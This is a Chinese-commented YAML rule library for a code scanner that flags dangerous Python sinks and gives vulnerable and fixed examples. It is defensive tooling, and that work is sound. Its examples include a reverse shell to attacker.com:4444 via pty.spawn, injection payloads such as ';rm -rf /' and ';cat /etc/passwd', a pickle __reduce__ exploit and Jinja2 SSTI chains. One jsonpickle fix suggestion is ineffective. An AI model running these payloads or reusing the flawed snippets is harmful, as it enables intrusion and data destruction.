# =============================================================================
# CodeScan Core Security Rules - 统一安全规则库
# =============================================================================
# 版本: 2.0.0
# 维护: 整合自 extended_rules.yaml, comprehensive_rules.yaml, extended/ 目录
# 原则: 高精准度 > 高召回率，每条规则都有明确的安全价值
# =============================================================================

_metadata:
  version: "2.0.0"
  last_updated: "2025-12-25"
  description: |
    核心安全规则库，专注于检测高危漏洞的 sink 点。
    规则设计原则：
    1. 精准匹配 - 使用完整限定名，避免误报
    2. 高价值 - 聚焦 RCE/SQLi/文件操作/反序列化/SSRF 等高危类型
    3. 无冗余 - 功能相似的规则合并为一条
    4. 可操作 - 每条规则都有明确的修复建议

rules:
  # ===========================================================================
  # 第一部分: 命令执行 (RCE) - Critical
  # ===========================================================================

  - id: py-rce-os-system
    name: OS 命令执行 - os.system/popen
    rule_type: sink
    category: injection
    risk_level: critical
    languages: [python]
    patterns:
      - os.system
      - os.popen
      - os.popen2
      - os.popen3
      - os.popen4
    description: |
      os.system/popen 系列函数直接执行 shell 命令，
      如果参数包含用户输入，将导致远程命令执行漏洞。
    example: |
      # 漏洞代码示例
      @app.route('/ping')
      def ping():
          host = request.args.get('host')
          # 危险：用户输入直接拼接到命令
          os.system(f"ping -c 1 {host}")
          return "Done"

      # 攻击载荷: ?host=127.0.0.1;cat /etc/passwd
    attack_scenario: |
      攻击者通过分号、管道符等shell元字符注入恶意命令，
      可执行任意系统命令，获取服务器控制权。
    fix_suggestion: |
      1. 使用 subprocess.run() 配合 shell=False 和参数列表
      2. 使用 shlex.quote() 转义用户输入
      3. 实现命令白名单机制

      # 安全代码示例
      import subprocess
      import shlex

      @app.route('/ping')
      def ping():
          host = request.args.get('host')
          # 验证输入格式
          if not re.match(r'^[\w.-]+$', host):
              return "Invalid host", 400
          # 使用列表参数，避免shell注入
          result = subprocess.run(['ping', '-c', '1', host],
                                  capture_output=True, shell=False)
          return result.stdout
    cwe_ids: ["CWE-78"]
    owasp_ids: ["A03:2021"]
    tags: [rce, command_injection, critical]

  - id: py-rce-subprocess
    name: 命令执行 - subprocess 模块
    rule_type: sink
    category: injection
    risk_level: critical
    languages: [python]
    patterns:
      - subprocess.call
      - subprocess.run
      - subprocess.Popen
      - subprocess.check_call
      - subprocess.check_output
      - subprocess.getoutput
      - subprocess.getstatusoutput
    description: |
      subprocess 模块的命令执行函数，当 shell=True 或参数拼接用户输入时，
      可能导致命令注入。
    example: |
      # 漏洞代码示例 1: shell=True 危险用法
      @app.route('/convert')
      def convert():
          filename = request.args.get('file')
          # 危险：shell=True 且用户输入拼接
          subprocess.call(f"convert {filename} output.png", shell=True)
          return "Done"

      # 漏洞代码示例 2: getoutput 无法禁用 shell
      output = subprocess.getoutput(f"ls {user_input}")

      # 攻击载荷: ?file=test.jpg;rm -rf /
    attack_scenario: |
      当 shell=True 时，攻击者可注入 shell 元字符执行任意命令。
      getoutput/getstatusoutput 内部始终使用 shell，更加危险。
    fix_suggestion: |
      1. 设置 shell=False（默认值）
      2. 使用列表形式传递命令和参数，不要字符串拼接
      3. 验证用户输入符合预期格式

      # 安全代码示例
      @app.route('/convert')
      def convert():
          filename = request.args.get('file')
          # 验证文件名只包含安全字符
          if not re.match(r'^[\w.-]+$', filename):
              return "Invalid filename", 400
          # 使用列表参数，shell=False
          subprocess.run(['convert', filename, 'output.png'], shell=False)
          return "Done"
    cwe_ids: ["CWE-78"]
    owasp_ids: ["A03:2021"]
    tags: [rce, subprocess, critical]

  - id: py-rce-eval-exec
    name: 代码执行 - eval/exec/compile
    rule_type: sink
    category: injection
    risk_level: critical
    languages: [python]
    patterns:
      - eval
      - exec
      - compile
      - execfile
    description: |
      eval/exec/compile 可执行任意 Python 代码，
      绝对不应该用于处理用户输入。
    example: |
      # 漏洞代码示例 1: eval 执行用户输入
      @app.route('/calc')
      def calculator():
          expr = request.args.get('expr')
          # 危险：直接执行用户输入
          result = eval(expr)
          return str(result)

      # 漏洞代码示例 2: exec 执行动态代码
      code = request.form.get('code')
      exec(code)  # RCE

      # 攻击载荷: ?expr=__import__('os').system('id')
    attack_scenario: |
      攻击者可通过 __import__、__builtins__ 等内置对象
      绕过简单过滤，执行任意 Python 代码实现 RCE。
    fix_suggestion: |
      1. 避免使用 eval/exec 处理用户输入
      2. 如需解析数据，使用 ast.literal_eval() 替代 eval()
      3. 如需动态功能，使用白名单映射

      # 安全代码示例
      import ast

      @app.route('/calc')
      def calculator():
          expr = request.args.get('expr')
          try:
              # ast.literal_eval 只能解析字面量
              result = ast.literal_eval(expr)
              return str(result)
          except (ValueError, SyntaxError):
              return "Invalid expression", 400
    cwe_ids: ["CWE-94", "CWE-95"]
    owasp_ids: ["A03:2021"]
    tags: [rce, code_injection, critical]

  - id: py-rce-pty-spawn
    name: 伪终端执行 - pty.spawn
    rule_type: sink
    category: injection
    risk_level: critical
    languages: [python]
    patterns:
      - pty.spawn
    description: |
      pty.spawn 可生成交互式 shell，常用于反弹 shell 攻击。
    example: |
      # 漏洞代码示例: 反弹 shell
      import pty
      import socket

      s = socket.socket()
      s.connect(("attacker.com", 4444))
      pty.spawn("/bin/bash")  # 生成交互式 shell

      # 常见于 webshell 和后门代码中
    attack_scenario: |
      攻击者上传恶意代码后，通过 pty.spawn 获取交互式 shell，
      可完全控制服务器。
    fix_suggestion: |
      1. 生产代码中禁止使用 pty.spawn
      2. 使用 WAF 检测反弹 shell 行为
      3. 监控异常的网络外连行为
    cwe_ids: ["CWE-78"]
    owasp_ids: ["A03:2021"]
    tags: [rce, shell, critical]

  # ===========================================================================
  # 第二部分: SQL 注入 - Critical/High
  # ===========================================================================

  - id: py-sqli-raw-query
    name: SQL 注入 - 原始查询执行
    rule_type: sink
    category: injection
    risk_level: critical
    languages: [python]
    patterns:
      - cursor.execute
      - cursor.executemany
      - cursor.callproc
      - connection.execute
      - engine.execute
      - session.execute
    description: |
      直接执行 SQL 语句时，如果使用字符串拼接构造 SQL，
      将导致 SQL 注入漏洞。
    example: |
      # 漏洞代码示例
      @app.route('/user/<user_id>')
      def get_user(user_id):
          conn = get_db_connection()
          cursor = conn.cursor()
          # 危险：字符串拼接 SQL
          sql = f"SELECT * FROM users WHERE id = {user_id}"
          cursor.execute(sql)
          return cursor.fetchone()

      # 攻击载荷: /user/1 OR 1=1--
    attack_scenario: |
      攻击者通过注入 SQL 片段，可以：
      1. 绕过认证 (OR 1=1)
      2. 泄露数据 (UNION SELECT)
      3. 修改/删除数据 (UPDATE/DELETE)
      4. 执行系统命令 (xp_cmdshell)
    fix_suggestion: |
      1. 使用参数化查询 cursor.execute(sql, params)
      2. 使用 ORM 的查询构建器
      3. 永远不要拼接用户输入到 SQL 字符串

      # 安全代码示例
      @app.route('/user/<user_id>')
      def get_user(user_id):
          cursor = conn.cursor()
          # 使用参数化查询
          cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
          return cursor.fetchone()
    cwe_ids: ["CWE-89"]
    owasp_ids: ["A03:2021"]
    tags: [sqli, database, critical]

  - id: py-sqli-django-raw
    name: SQL 注入 - Django RawSQL/raw()
    rule_type: sink
    category: injection
    risk_level: high
    languages: [python]
    patterns:
      - RawSQL
      - .raw(
      - .extra(
      - connection.cursor
    frameworks: [django]
    description: |
      Django 的 raw() 和 extra() 方法绑定原始 SQL，
      RawSQL 表达式同样存在注入风险。
    fix_suggestion: |
      1. 使用 Django ORM 查询集
      2. 如必须使用 raw()，确保使用参数占位符
      3. 避免使用已废弃的 extra()
    cwe_ids: ["CWE-89"]
    tags: [sqli, django]

  - id: py-sqli-sqlalchemy
    name: SQL 注入 - SQLAlchemy text()
    rule_type: sink
    category: injection
    risk_level: high
    languages: [python]
    patterns:
      - text(
      - from_statement
      - "prefix:filter("
    frameworks: [sqlalchemy, flask]
    description: SQLAlchemy 的 text() 构造器用于原始 SQL，需要使用绑定参数
    fix_suggestion: |
      使用 text("SELECT * FROM users WHERE id = :id").bindparams(id=user_id)
    cwe_ids: ["CWE-89"]
    tags: [sqli, sqlalchemy]

  # ===========================================================================
  # 第三部分: 文件操作漏洞 - High
  # ===========================================================================

  - id: py-file-path-traversal
    name: 路径遍历 - 文件读写
    rule_type: sink
    category: file
    risk_level: high
    languages: [python]
    patterns:
      - open
      - "pathlib.Path.read_text"
      - "pathlib.Path.read_bytes"
      - "pathlib.Path.write_text"
      - "pathlib.Path.write_bytes"
      - "io.open"
    description: |
      文件打开操作如果路径包含用户输入，可能导致：
      - 任意文件读取（敏感信息泄露）
      - 任意文件写入（代码执行、配置覆盖）
    fix_suggestion: |
      1. 使用 os.path.realpath() 规范化路径
      2. 验证规范化后的路径在允许目录内
      3. 使用白名单限制可访问的文件
    cwe_ids: ["CWE-22", "CWE-23"]
    owasp_ids: ["A01:2021"]
    tags: [path_traversal, file_read, file_write]

  - id: py-file-shutil
    name: 文件操作 - shutil 模块
    rule_type: sink
    category: file
    risk_level: high
    languages: [python]
    patterns:
      - shutil.copy
      - shutil.copy2
      - shutil.copyfile
      - shutil.copytree
      - shutil.move
      - shutil.rmtree
    description: shutil 模块的文件复制/移动/删除操作，需要验证路径安全
    cwe_ids: ["CWE-22"]
    tags: [file_operation, path_traversal]

  - id: py-file-send
    name: 文件下载 - send_file/send_from_directory
    rule_type: sink
    category: file
    risk_level: high
    languages: [python]
    patterns:
      - send_file
      - send_from_directory
      - FileResponse
      - StreamingResponse
    frameworks: [flask, django, fastapi]
    description: |
      文件下载接口如果路径可控，可能导致任意文件读取。
      攻击者可下载源代码、配置文件、密钥等敏感文件。
    fix_suggestion: |
      1. send_from_directory 比 send_file 更安全（限定目录）
      2. 使用 safe_join 或验证路径不包含 ..
      3. 使用文件 ID 映射替代直接传递文件名
    cwe_ids: ["CWE-22", "CWE-200"]
    tags: [file_read, download]

  - id: py-file-upload
    name: 文件上传处理
    rule_type: sink
    category: file
    risk_level: high
    languages: [python]
    patterns:
      - .save(
      - "request.files"
      - "file.save"
      - "uploaded_file.save"
    description: |
      文件上传功能需要验证：
      1. 文件类型（不仅是扩展名）
      2. 文件大小
      3. 存储路径（避免路径遍历）
    cwe_ids: ["CWE-434"]
    tags: [file_upload]

  # ===========================================================================
  # 第四部分: 反序列化漏洞 - Critical
  # ===========================================================================

  - id: py-deserialize-pickle
    name: 反序列化 - pickle 模块
    rule_type: sink
    category: deserialization
    risk_level: critical
    languages: [python]
    patterns:
      - pickle.loads
      - pickle.load
      - cPickle.loads
      - cPickle.load
      - _pickle.loads
      - _pickle.load
      - shelve.open
    description: |
      pickle 反序列化不可信数据会导致远程代码执行。
      pickle 可以序列化任意 Python 对象，包括恶意代码。
    example: |
      # 漏洞代码示例
      import pickle
      import base64

      @app.route('/load')
      def load_data():
          data = request.args.get('data')
          # 危险：反序列化用户输入
          obj = pickle.loads(base64.b64decode(data))
          return str(obj)

      # 恶意 payload 构造示例
      import os
      class Exploit:
          def __reduce__(self):
              return (os.system, ('id',))
      payload = base64.b64encode(pickle.dumps(Exploit()))
    attack_scenario: |
      攻击者构造恶意 pickle 数据，利用 __reduce__ 方法
      在反序列化时执行任意代码，实现 RCE。
    fix_suggestion: |
      1. 永远不要反序列化不可信来源的数据
      2. 使用 JSON 等安全格式替代 pickle
      3. 如必须使用 pickle，使用 hmac 验证数据完整性

      # 安全代码示例
      import json

      @app.route('/load')
      def load_data():
          data = request.args.get('data')
          # 使用 JSON 替代 pickle
          obj = json.loads(data)
          return str(obj)
    cwe_ids: ["CWE-502"]
    owasp_ids: ["A08:2021"]
    tags: [deserialization, rce, critical]

  - id: py-deserialize-yaml
    name: 反序列化 - YAML 不安全加载
    rule_type: sink
    category: deserialization
    risk_level: critical
    languages: [python]
    patterns:
      - yaml.load
      - yaml.unsafe_load
      - yaml.full_load
    description: |
      yaml.load() 默认使用 FullLoader，仍存在代码执行风险。
      只有 yaml.safe_load() 是安全的。
    example: |
      # 漏洞代码示例
      import yaml

      @app.route('/config')
      def load_config():
          config_data = request.form.get('config')
          # 危险：yaml.load 可执行代码
          config = yaml.load(config_data, Loader=yaml.FullLoader)
          return str(config)

      # 恶意 YAML payload
      # !!python/object/apply:os.system ['id']
    attack_scenario: |
      攻击者通过 YAML 的 Python 对象标签（!!python/object）
      在解析时执行任意 Python 代码。
    fix_suggestion: |
      使用 yaml.safe_load() 替代 yaml.load()

      # 安全代码示例
      import yaml

      @app.route('/config')
      def load_config():
          config_data = request.form.get('config')
          # safe_load 只解析基本数据类型
          config = yaml.safe_load(config_data)
          return str(config)
    cwe_ids: ["CWE-502"]
    owasp_ids: ["A08:2021"]
    tags: [deserialization, yaml, critical]

  - id: py-deserialize-marshal
    name: 反序列化 - marshal 模块
    rule_type: sink
    category: deserialization
    risk_level: critical
    languages: [python]
    patterns:
      - marshal.loads
      - marshal.load
    description: |
      marshal 用于 Python 字节码序列化，反序列化恶意数据会执行代码。
    example: |
      # 漏洞代码示例
      import marshal

      @app.route('/run')
      def run_code():
          code_data = request.get_data()
          # 危险：反序列化字节码并执行
          code_obj = marshal.loads(code_data)
          exec(code_obj)

      # marshal 可序列化代码对象，极其危险
    attack_scenario: |
      攻击者发送恶意字节码，通过 marshal 反序列化后执行，
      可实现任意代码执行。
    fix_suggestion: |
      1. 禁止从不可信来源加载 marshal 数据
      2. marshal 仅用于 .pyc 文件，不应用于网络传输
      3. 使用 JSON 等安全格式
    cwe_ids: ["CWE-502"]
    owasp_ids: ["A08:2021"]
    tags: [deserialization, critical]

  - id: py-deserialize-jsonpickle
    name: 反序列化 - jsonpickle
    rule_type: sink
    category: deserialization
    risk_level: critical
    languages: [python]
    patterns:
      - jsonpickle.decode
      - jsonpickle.loads
    description: |
      jsonpickle 扩展了 JSON，支持任意 Python 对象，存在 RCE 风险。
    example: |
      # 漏洞代码示例
      import jsonpickle

      @app.route('/api/data')
      def load_data():
          json_data = request.get_json()
          # 危险：jsonpickle 可重建任意对象
          obj = jsonpickle.decode(json_data)
          return str(obj)

      # 恶意 JSON payload 包含 py/object 标签
    attack_scenario: |
      jsonpickle 使用 JSON 格式但支持 Python 对象序列化，
      攻击者可构造恶意 JSON 触发代码执行。
    fix_suggestion: |
      1. 使用标准 json 模块替代 jsonpickle
      2. 如需序列化复杂对象，使用 dataclass + json
      3. 设置 jsonpickle.set_encoder_options('json', ensure_ascii=False)
    cwe_ids: ["CWE-502"]
    owasp_ids: ["A08:2021"]
    tags: [deserialization, jsonpickle, critical]

  # ===========================================================================
  # 第五部分: SSRF - High
  # ===========================================================================

  - id: py-ssrf-requests
    name: SSRF - requests 库
    rule_type: sink
    category: ssrf
    risk_level: high
    languages: [python]
    patterns:
      - requests.get
      - requests.post
      - requests.put
      - requests.delete
      - requests.head
      - requests.patch
      - requests.request
    description: |
      requests 库发起 HTTP 请求时，如果 URL 来自用户输入，
      可能导致 SSRF 攻击，访问内网服务或云元数据 API。
    fix_suggestion: |
      1. 验证 URL 协议（只允许 http/https）
      2. 验证目标不是内网地址（10.x/172.16.x/192.168.x/127.x）
      3. 使用 URL 白名单
      4. 禁止重定向跟随到内网地址
    cwe_ids: ["CWE-918"]
    owasp_ids: ["A10:2021"]
    tags: [ssrf, network]

  - id: py-ssrf-urllib
    name: SSRF - urllib 模块
    rule_type: sink
    category: ssrf
    risk_level: high
    languages: [python]
    patterns:
      - urllib.request.urlopen
      - urllib.request.urlretrieve
      - urllib2.urlopen
      - urllib.urlopen
    description: urllib 发起 HTTP 请求，URL 用户可控时存在 SSRF 风险
    cwe_ids: ["CWE-918"]
    tags: [ssrf, urllib]

  - id: py-ssrf-httpx
    name: SSRF - httpx/aiohttp
    rule_type: sink
    category: ssrf
    risk_level: high
    languages: [python]
    patterns:
      - httpx.get
      - httpx.post
      - httpx.request
      - aiohttp.ClientSession
      - "client.get"
      - "client.post"
    description: httpx 和 aiohttp 是现代异步 HTTP 客户端，同样存在 SSRF 风险
    cwe_ids: ["CWE-918"]
    tags: [ssrf, async]

  - id: py-ssrf-socket
    name: SSRF - 底层 socket 操作
    rule_type: sink
    category: ssrf
    risk_level: high
    languages: [python]
    patterns:
      - socket.connect
      - socket.create_connection
      - socket.socket
    description: 底层 socket 连接，目标地址用户可控时存在 SSRF 风险
    cwe_ids: ["CWE-918"]
    tags: [ssrf, socket]

  # ===========================================================================
  # 第六部分: 模板注入 (SSTI) - Critical
  # ===========================================================================

  - id: py-ssti-jinja2
    name: 模板注入 - Jinja2
    rule_type: sink
    category: injection
    risk_level: critical
    languages: [python]
    patterns:
      - Template(
      - "from_string("
      - render_template_string
      - Environment
    frameworks: [flask, jinja2]
    description: |
      Jinja2 模板引擎如果模板内容来自用户输入，
      攻击者可利用模板语法执行任意 Python 代码。
    example: |
      # 漏洞代码示例
      from flask import render_template_string

      @app.route('/hello')
      def hello():
          name = request.args.get('name')
          # 危险：用户输入作为模板内容
          template = f"Hello {name}!"
          return render_template_string(template)

      # 攻击载荷: ?name={{config.items()}}
      # RCE 载荷: ?name={{''.__class__.__mro__[1].__subclasses__()}}
    attack_scenario: |
      攻击者通过 Jinja2 模板语法访问 Python 对象，
      利用 __class__.__mro__.__subclasses__() 链获取危险类，
      最终实现任意代码执行。
    fix_suggestion: |
      1. 永远不要将用户输入作为模板内容
      2. 用户输入应作为模板变量传入
      3. 使用沙箱环境 SandboxedEnvironment

      # 安全代码示例
      @app.route('/hello')
      def hello():
          name = request.args.get('name')
          # 用户输入作为变量，不是模板
          return render_template_string("Hello {{ name }}!", name=name)
    cwe_ids: ["CWE-94"]
    owasp_ids: ["A03:2021"]
    tags: [ssti, template_injection, critical]

